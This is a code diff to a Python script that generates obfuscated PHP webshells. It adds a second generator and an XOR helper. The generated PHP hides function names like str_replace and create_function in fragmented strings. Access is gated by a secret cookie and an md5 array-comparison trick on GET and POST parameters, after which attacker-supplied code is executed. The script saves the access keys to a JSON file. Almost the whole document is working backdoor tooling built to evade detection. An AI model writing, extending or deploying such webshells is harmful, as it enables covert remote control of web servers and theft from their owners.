@@ -81,6 +81,54 @@ for i in range(1, 99):
         variables.append(variable)
 
 
+def gen_php_webshell2():
+    """
+    生成php版本webshell
+    :return:
+    """
+    webshell = '<?php' + f' if ($_COOKIE[\'{cookie_name}\'] == "{cookie_value}") ' + '{' + f"""
+    ${variables[0]} = 'str_r';
+    ${variables[1]} = ${variables[0]}.'eplace';
+    ${variables[2]} = substr(${variables[1]}, 7);
+    ${variables[3]} = 's{variables[4]}t{variables[4]}r{variables[4]}_{variables[4]}r{variables[4]}e{variables[4]}p';
+    if ($_GET['{variables[5]}'] !== $_GET['{variables[6]}'] && @md5($_GET['{variables[5]}']) === @md5($_GET['{variables[6]}']))""" + "{" + f"""
+    ${variables[7]} = 'str_rep';
+    ${variables[3]} = substr_replace('{variables[4]}',${variables[7]},${variables[3]});
+    """ + "}" + "else{die();}" + f"""
+    if (!($_POST['{p1}'] !== $_POST['{p2}'] && @md5($_POST['{p1}']) === @md5($_POST['{p2}'])))""" + "{die();}" + f"""
+    ${variables[2]}=${variables[3]}.${variables[2]};
+    ${variables[8]}=${variables[2]}("{variables[9][1]}", "", "{variables[9][0]}");
+    ${variables[10]}=${variables[8]}("{variables[11][1]}", "", "{variables[11][0]}");
+    ${variables[12]}=${variables[10]}(${variables[8]}("{variables[13][1]}", "", "{variables[13][0]}"));
+    ${variables[14]}=${variables[10]}(${variables[8]}("{variables[15][1]}", "", "{variables[15][0]}"));
+    ${variables[16]}=${variables[10]}(${variables[8]}("{variables[17][1]}", "", "{variables[17][0]}"));
+    ${variables[18]}=${variables[10]}(${variables[8]}("{variables[19][1]}", "", "{variables[19][0]}"));
+    @${value1}=${variables[14]};
+    @$${value1}=${variables[16]};
+    @${zh_1}=${value1}.$${value1};
+    @${value2}=${zh_1};
+    @$${value2}=${variables[18]};
+    @${name_x_1}=${value2};
+    @${name_z_1}=$${value2};
+    @${n_0} = ${variables[12]}('${echo_1},${echo_2}','return "${echo_1}"."${echo_2}";');
+    @${n_1}=${n_0}(${name_x_1},${name_z_1});
+    @${variables[20]} = ${variables[12]}("", ${n_1});
+    @${variables[20]}();
+    """ + "} " + "?>"
+    webshell = webshell.replace('\n', '')
+    webshell = webshell.replace('    ', '')
+    setting = "GET参数: " + variables[5] + "[]=2" + "&" + variables[6] + "[]=1\n" + "Cookie:  " + cookie_name + "=" + cookie_value + "\n密码:    " + f'{p1}[]=2&{p2}[]=1&{passwords}'
+    config = {
+        "GET": "" + variables[5] + "[]=2" + "&" + variables[6] + "[]=1",
+        "Cookie": cookie_name + "=" + cookie_value,
+        "Passwords": f'{p1}[]=2&{p2}[]=1&{passwords}'
+    }
+    with open("./latest_gennerated.json", "w") as json_file:
+        json.dump(config, json_file, indent=4)
+    result = [webshell, setting]
+    return result
+
+
 def gen_php_webshell():
     """
     生成php版本webshell
@@ -114,6 +162,15 @@ def gen_php_webshell():
     @${n_1}=${n_0}(${name_x_1},${name_z_1});
     @${variables[20]} = ${variables[12]}("", ${n_1});
     @${variables[20]}();
+    function xor_encrypt_decrypt($data, $key) {{
+    $len = strlen($data);
+    $keylen = strlen($key);
+    $out = '';
+    for ($i = 0; $i < $len; ++$i) {{
+        $out .= $data[$i] ^ $key[$i % $keylen];
+    }}
+    return $out;
+    }}
     """ + "} " + "?>"
     webshell = webshell.replace('\n', '')
     webshell = webshell.replace('    ', '')
